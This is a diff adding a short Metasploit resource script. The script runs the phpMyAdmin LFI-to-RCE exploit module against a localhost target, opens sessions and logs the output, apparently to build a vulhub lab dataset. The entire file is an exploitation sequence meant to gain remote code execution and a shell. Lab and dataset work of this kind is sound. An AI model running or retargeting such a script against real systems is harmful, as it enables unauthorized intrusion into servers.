@@ -1,0 +1,15 @@
+spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/phpmyadmin_12613/scan3.stdout
+use exploit/multi/http/phpmyadmin_lfi_rce
+set RHOSTS 127.0.0.1
+set RPORT 18027
+set LHOST 127.0.0.1
+set LPORT 4451
+set TARGETURI /
+set SSL false
+set VERBOSE true
+check
+run -j
+sleep 20
+sessions
+spool off
+exit
